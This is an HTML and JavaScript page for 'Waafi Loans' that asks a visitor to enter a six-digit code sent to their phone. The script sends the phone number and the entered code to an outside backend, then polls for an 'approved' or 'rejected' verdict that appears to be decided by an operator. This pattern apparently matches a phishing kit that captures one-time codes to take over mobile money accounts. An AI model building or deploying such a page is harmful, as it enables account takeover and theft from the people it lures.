<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>OTP Verification — Waafi Loans</title>
    <meta name="description" content="Enter the OTP code sent to your phone to complete your Waafi loan application verification." />
    <meta name="author" content="Waafi Loans" />
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>W</text></svg>" />
    <style>
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: oklch(56% .14 152);
            --primary-10: oklab(0.56 -0.123613 0.065726 / 0.10);
            --primary-90: oklab(0.56 -0.123613 0.065726 / 0.9);
            --secondary: oklch(96% .02 150);
            --background: oklch(99.5% .003 145);
            --card: oklch(100% 0 0);
            --border: oklch(91% .012 150);
            --input: oklch(91% .012 150);
            --text-primary: oklch(22% .02 150);
            --text-muted: oklch(50% .02 152);
            --radius: 16px;
            --radius-sm: 10px;
            --radius-xl: 12px;
            --transition: 0.25s cubic-bezier(0.16, 1, 0.32, 1);
            --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: var(--font-sans);
            background: var(--background);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        a {
            text-decoration: none;
            color: inherit;
        }

        /* ===== HEADER ===== */
        .header {
            position: sticky;
            top: 0;
            z-index: 40;
            background: oklab(1 0 0 / 0.95);
            backdrop-filter: blur(12px);
            border-bottom: 1px solid var(--border);
        }

        .header-inner {
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 64px;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 16px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo-icon {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 36px;
            height: 36px;
            background: var(--primary);
            color: #fff;
            border-radius: 8px;
            font-size: 0.875rem;
            font-weight: 700;
        }

        .logo-text {
            font-size: 1.125rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            color: var(--text-primary);
        }

        .nav {
            display: none;
            align-items: center;
            gap: 24px;
        }

        .nav a {
            font-size: 0.875rem;
            font-weight: 500;
            color: var(--text-muted);
            transition: color var(--transition);
        }

        .nav a:hover,
        .nav a.active {
            color: var(--primary);
        }

        .lang-btn {
            display: flex;
            align-items: center;
            gap: 4px;
            background: transparent;
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 4px 8px;
            font-size: 0.875rem;
            font-weight: 500;
            color: var(--text-primary);
            cursor: pointer;
            transition: all var(--transition);
        }

        .lang-btn:hover {
            border-color: var(--primary);
        }

        .lang-btn svg {
            width: 16px;
            height: 16px;
        }

        .mobile-menu-btn {
            display: block;
            background: none;
            border: none;
            color: var(--text-primary);
            cursor: pointer;
            padding: 4px;
        }

        .mobile-menu-btn svg {
            width: 24px;
            height: 24px;
        }

        /* ===== MAIN CONTENT ===== */
        .main-content {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 48px 16px;
        }

        .otp-container {
            max-width: 448px;
            width: 100%;
            margin: 0 auto;
        }

        .otp-card {
            padding: 32px;
            border-radius: var(--radius);
            border: 1px solid var(--border);
            background: var(--card);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
        }

        .otp-icon {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 64px;
            height: 64px;
            border-radius: 50%;
            background: var(--primary-10);
            margin: 0 auto 16px;
        }

        .otp-icon svg {
            width: 32px;
            height: 32px;
            color: var(--primary);
        }

        .otp-title {
            text-align: center;
            font-size: 1.5rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            color: var(--text-primary);
            margin-bottom: 4px;
        }

        .otp-subtitle {
            text-align: center;
            font-size: 0.875rem;
            color: var(--text-muted);
            margin-bottom: 4px;
        }

        .otp-phone {
            text-align: center;
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 24px;
        }

        /* ===== OTP INPUTS ===== */
        .otp-inputs-wrapper {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-bottom: 24px;
        }

        .otp-input {
            width: 48px;
            height: 56px;
            text-align: center;
            font-size: 1.25rem;
            font-weight: 600;
            border-radius: 8px;
            border: 2px solid var(--input);
            background: var(--card);
            color: var(--text-primary);
            outline: none;
            transition: all var(--transition);
        }

        .otp-input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 2px oklab(0.56 -0.123613 0.065726 / 0.4);
        }

        .otp-input.error {
            border-color: #ef4444;
            animation: shake 0.3s ease;
        }

        .otp-input:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        @keyframes shake {
            0%,
            100% {
                transform: translateX(0);
            }
            25% {
                transform: translateX(-6px);
            }
            75% {
                transform: translateX(6px);
            }
        }

        /* ===== STATUS MESSAGE ===== */
        .status-message {
            text-align: center;
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 16px;
            display: none;
            font-size: 0.9rem;
            font-weight: 500;
        }

        .status-message.show {
            display: block;
        }

        .status-message.waiting {
            background: #fef3c7;
            color: #92400e;
            border: 1px solid #fcd34d;
        }

        .status-message.success {
            background: #f0fdf4;
            color: #166534;
            border: 1px solid #86efac;
        }

        .status-message.error {
            background: #fef2f2;
            color: #991b1b;
            border: 1px solid #fca5a5;
        }

        .status-message.info {
            background: #eff6ff;
            color: #1e40af;
            border: 1px solid #93c5fd;
        }

        /* ===== TIMER ===== */
        .otp-timer {
            text-align: center;
            font-size: 0.875rem;
            color: var(--text-muted);
            margin-bottom: 16px;
        }

        .otp-timer .time {
            font-weight: 600;
            color: var(--primary);
        }

        .otp-timer .resend {
            color: var(--primary);
            font-weight: 500;
            cursor: pointer;
            transition: color var(--transition);
        }

        .otp-timer .resend:hover {
            text-decoration: underline;
        }

        .otp-timer .resend.disabled {
            color: var(--text-muted);
            cursor: not-allowed;
        }

        .otp-timer .resend.disabled:hover {
            text-decoration: none;
        }

        /* ===== BUTTONS ===== */
        .otp-btn {
            width: 100%;
            padding: 12px 24px;
            border-radius: 12px;
            border: none;
            background: var(--primary);
            color: #fff;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all var(--transition);
        }

        .otp-btn:hover {
            background: var(--primary-90);
            transform: scale(1.01);
        }

        .otp-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        /* ===== SPINNER ===== */
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ===== FOOTER ===== */
        .footer {
            border-top: 1px solid var(--border);
            background: var(--secondary);
            padding: 32px 0;
        }

        .footer-inner {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 16px;
            text-align: center;
            font-size: 0.875rem;
            color: var(--text-muted);
        }

        /* ===== RESPONSIVE ===== */
        @media (min-width: 768px) {
            .nav {
                display: flex;
            }
            .mobile-menu-btn {
                display: none;
            }
        }

        @media (max-width: 767px) {
            .nav {
                display: none;
                flex-direction: column;
                position: absolute;
                top: 64px;
                left: 0;
                right: 0;
                background: oklab(1 0 0 / 0.98);
                backdrop-filter: blur(12px);
                padding: 20px 16px;
                border-bottom: 1px solid var(--border);
                gap: 16px;
                align-items: flex-start;
            }

            .nav.open {
                display: flex;
            }

            .main-content {
                padding: 32px 16px;
            }

            .otp-card {
                padding: 24px;
            }

            .otp-input {
                width: 40px;
                height: 48px;
                font-size: 1rem;
            }

            .otp-inputs-wrapper {
                gap: 8px;
            }
        }

        @media (max-width: 480px) {
            .otp-input {
                width: 36px;
                height: 44px;
                font-size: 0.875rem;
            }
            .otp-inputs-wrapper {
                gap: 6px;
            }
            .otp-card {
                padding: 20px;
            }
        }
    </style>
</head>
<body>

    <!-- ===== HEADER ===== -->
    <header class="header">
        <div class="header-inner">
            <a class="logo" href="index.html">
                <span class="logo-icon">W</span>
                <span class="logo-text">Waafi Loans</span>
            </a>

            <nav class="nav" id="mainNav">
                <a href="index.html">Home</a>
                <a href="apply.html" class="active">Apply Now</a>
                <a href="testimonials.html">Testimonials</a>
                <a href="terms.html">Terms and Conditions</a>
                <a href="loan-policy.html">Loan Policy</a>
                <button class="lang-btn">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10" />
                        <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
                        <path d="M2 12h20" />
                    </svg>
                    <span id="headerLangText">EN</span>
                </button>
            </nav>

            <button class="mobile-menu-btn" id="menuToggle" aria-label="Menu">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M4 5h16" />
                    <path d="M4 12h16" />
                    <path d="M4 19h16" />
                </svg>
            </button>
        </div>
    </header>

    <!-- ===== MAIN CONTENT ===== -->
    <main class="main-content">
        <div class="otp-container">
            <div class="otp-card">

                <!-- Icon -->
                <div class="otp-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M22 2L11 13" />
                        <path d="M22 2L15 22l-4-9-9-4z" />
                    </svg>
                </div>

                <!-- Title -->
                <h1 class="otp-title">Enter OTP Code</h1>
                <p class="otp-subtitle">We sent a 6-digit verification code to</p>
                <p class="otp-phone" id="phoneDisplay">+252 61 234 5678</p>

                <!-- Status Message -->
                <div class="status-message" id="statusMessage"></div>

                <!-- OTP Inputs -->
                <div class="otp-inputs-wrapper" id="otpContainer">
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
                </div>

                <!-- Timer -->
                <div class="otp-timer">
                    <span id="timerText">Resend code in <span class="time" id="timerCount">60</span>s</span>
                    <span id="resendText" style="display:none;">
                        Didn't receive the code? <span class="resend" id="resendBtn">Resend OTP</span>
                    </span>
                </div>

                <!-- Verify Button -->
                <button type="button" class="otp-btn" id="verifyBtn">Verify OTP</button>

            </div>
        </div>
    </main>

    <!-- ===== FOOTER ===== -->
    <footer class="footer">
        <div class="footer-inner">
            © 2026 Waafi Loans. All rights reserved.
        </div>
    </footer>

    <!-- ===== SCRIPTS ===== -->
    <script>
        // ===== BACKEND API URL =====
        const API_URL = 'https://waafi-loans-production.up.railway.app';

        // ===== DOM ELEMENTS =====
        const phoneDisplay = document.getElementById('phoneDisplay');
        const statusMessage = document.getElementById('statusMessage');
        const otpInputs = document.querySelectorAll('.otp-input');
        const verifyBtn = document.getElementById('verifyBtn');
        const otpContainer = document.getElementById('otpContainer');
        const timerCount = document.getElementById('timerCount');
        const timerText = document.getElementById('timerText');
        const resendText = document.getElementById('resendText');
        const resendBtn = document.getElementById('resendBtn');

        let statusCheckInterval = null;
        let isVerifying = false;
        let isComplete = false;

        // ===== LANGUAGE =====
        const savedLang = localStorage.getItem('waafi-language') || 'en';
        document.getElementById('headerLangText').textContent = savedLang === 'en' ? 'EN' : 'SO';

        // ===== MOBILE MENU =====
        const menuToggle = document.getElementById('menuToggle');
        const mainNav = document.getElementById('mainNav');

        menuToggle.addEventListener('click', function() {
            mainNav.classList.toggle('open');
        });

        document.querySelectorAll('.nav a').forEach(link => {
            link.addEventListener('click', () => {
                mainNav.classList.remove('open');
            });
        });

        // ===== PHONE FROM STORAGE =====
        const phoneNumber = localStorage.getItem('waafi-phone') || '+252 61 234 5678';
        phoneDisplay.textContent = phoneNumber;

        // ===== SHOW STATUS MESSAGE =====
        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = 'status-message show ' + type;
        }

        function hideStatus() {
            statusMessage.className = 'status-message';
            statusMessage.textContent = '';
        }

        // ===== DISABLE INPUTS =====
        function disableInputs(disabled) {
            otpInputs.forEach(input => {
                input.disabled = disabled;
            });
        }

        // ===== CLEAR OTP INPUTS =====
        function clearOTP() {
            otpInputs.forEach(input => {
                input.value = '';
            });
            otpInputs[0].focus();
        }

        // ===== SHOW APPROVED - REDIRECT TO SUCCESS =====
        function showApproved() {
            isComplete = true;
            if (statusCheckInterval) clearInterval(statusCheckInterval);

            showStatus('✅ OTP Verified! Redirecting to your loan details...', 'success');
            verifyBtn.innerHTML = '✓ Verified!';
            verifyBtn.style.background = '#22c55e';
            verifyBtn.disabled = true;
            disableInputs(true);

            setTimeout(() => {
                window.location.href = 'success.html';
            }, 2000);
        }

        // ===== SHOW REJECTED =====
        function showRejected() {
            isComplete = true;
            if (statusCheckInterval) clearInterval(statusCheckInterval);

            showStatus('❌ OTP was rejected. Please contact support.', 'error');
            verifyBtn.innerHTML = 'Try Again';
            verifyBtn.disabled = false;
            verifyBtn.style.background = '#ef4444';
            disableInputs(false);
        }

        // ===== SHOW WAITING =====
        function showWaiting() {
            showStatus('⏳ Waiting for verification... Please wait.', 'waiting');
        }

        // ===== SHOW ERROR =====
        function showError(message) {
            showStatus('❌ ' + message, 'error');
        }

        // ===== REQUEST OTP FROM BACKEND =====
        async function requestOTP() {
            try {
                showStatus('⏳ Sending OTP for verification...', 'info');
                disableInputs(true);
                verifyBtn.disabled = true;

                const response = await fetch(`${API_URL}/api/send-otp`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ phoneNumber: phoneNumber })
                });

                const result = await response.json();

                if (result.success) {
                    console.log('✅ OTP sent successfully');
                    showWaiting();
                    startCheckingStatus();
                    disableInputs(false);
                    verifyBtn.disabled = false;
                    clearOTP();
                } else {
                    showError('Failed to send OTP. Please try again.');
                    disableInputs(false);
                    verifyBtn.disabled = false;
                }
            } catch (error) {
                console.error('❌ Error:', error);
                showError('Network error. Please check your connection.');
                disableInputs(false);
                verifyBtn.disabled = false;
            }
        }

        // ===== CHECK OTP STATUS (Polling) =====
        function startCheckingStatus() {
            if (statusCheckInterval) clearInterval(statusCheckInterval);

            statusCheckInterval = setInterval(async () => {
                try {
                    const response = await fetch(`${API_URL}/api/check-otp-status`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ phoneNumber: phoneNumber })
                    });

                    const result = await response.json();

                    if (result.success) {
                        const status = result.data.status;
                        console.log(`📊 OTP Status: ${status}`);

                        if (status === 'approved') {
                            showApproved();
                        } else if (status === 'rejected') {
                            showRejected();
                        } else {
                            showWaiting();
                        }
                    } else if (result.status === 404) {
                        clearInterval(statusCheckInterval);
                        showError('OTP expired. Please request a new one.');
                        disableInputs(false);
                        verifyBtn.disabled = false;
                    }
                } catch (error) {
                    console.error('❌ Error checking status:', error);
                }
            }, 3000);
        }

        // ===== VERIFY OTP =====
        async function verifyOTP() {
            if (isVerifying || isComplete) return;

            let otp = '';
            otpInputs.forEach(input => {
                otp += input.value;
            });

            if (otp.length !== 6) {
                showError('Please enter all 6 digits.');
                return;
            }

            isVerifying = true;
            verifyBtn.innerHTML = '<span class="spinner"></span> Verifying...';
            verifyBtn.disabled = true;
            hideStatus();

            try {
                const response = await fetch(`${API_URL}/api/verify-otp`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ phoneNumber: phoneNumber, otp: otp })
                });

                const result = await response.json();

                if (result.success) {
                    showApproved();
                } else if (result.status === 'pending') {
                    showWaiting();
                    verifyBtn.innerHTML = 'Verify OTP';
                    verifyBtn.disabled = false;
                    isVerifying = false;
                    startCheckingStatus();
                } else {
                    showError(result.message || 'Invalid OTP. Please try again.');
                    verifyBtn.innerHTML = 'Verify OTP';
                    verifyBtn.disabled = false;
                    isVerifying = false;
                    clearOTP();
                }
            } catch (error) {
                console.error('❌ Error:', error);
                showError('Network error. Please try again.');
                verifyBtn.innerHTML = 'Verify OTP';
                verifyBtn.disabled = false;
                isVerifying = false;
            }
        }

        // ===== OTP INPUT EVENTS =====
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                const value = this.value;
                if (!/^[0-9]$/.test(value) && value !== '') {
                    this.value = '';
                    return;
                }
                this.classList.remove('error');
                hideStatus();

                if (value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }

                if (index === otpInputs.length - 1 && value.length === 1) {
                    setTimeout(() => verifyOTP(), 300);
                }
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });

            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                const digits = paste.replace(/\D/g, '').slice(0, otpInputs.length);
                digits.split('').forEach((digit, i) => {
                    if (otpInputs[i]) {
                        otpInputs[i].value = digit;
                    }
                });
                const nextIndex = Math.min(digits.length, otpInputs.length - 1);
                otpInputs[nextIndex].focus();
            });

            input.addEventListener('click', function() {
                this.select();
            });
        });

        // ===== VERIFY BUTTON =====
        verifyBtn.addEventListener('click', verifyOTP);

        // ===== TIMER =====
        let timer = 60;

        function startTimer() {
            timer = 60;
            timerText.style.display = 'inline';
            resendText.style.display = 'none';
            resendBtn.classList.add('disabled');

            const interval = setInterval(() => {
                timer--;
                timerCount.textContent = timer;

                if (timer === 0) {
                    clearInterval(interval);
                    timerText.style.display = 'none';
                    resendText.style.display = 'inline';
                    resendBtn.classList.remove('disabled');
                }
            }, 1000);
        }

        // ===== RESEND OTP =====
        resendBtn.addEventListener('click', function() {
            if (this.classList.contains('disabled')) return;

            this.textContent = 'Sending...';
            this.classList.add('disabled');

            if (statusCheckInterval) clearInterval(statusCheckInterval);

            clearOTP();
            verifyBtn.innerHTML = 'Verify OTP';
            verifyBtn.disabled = false;
            verifyBtn.style.background = '';
            disableInputs(false);
            hideStatus();
            isVerifying = false;
            isComplete = false;

            requestOTP();

            setTimeout(() => {
                this.textContent = 'Resend OTP';
                this.classList.remove('disabled');
                startTimer();
            }, 1000);
        });

        // ===== START =====
        startTimer();
        requestOTP();
    </script>
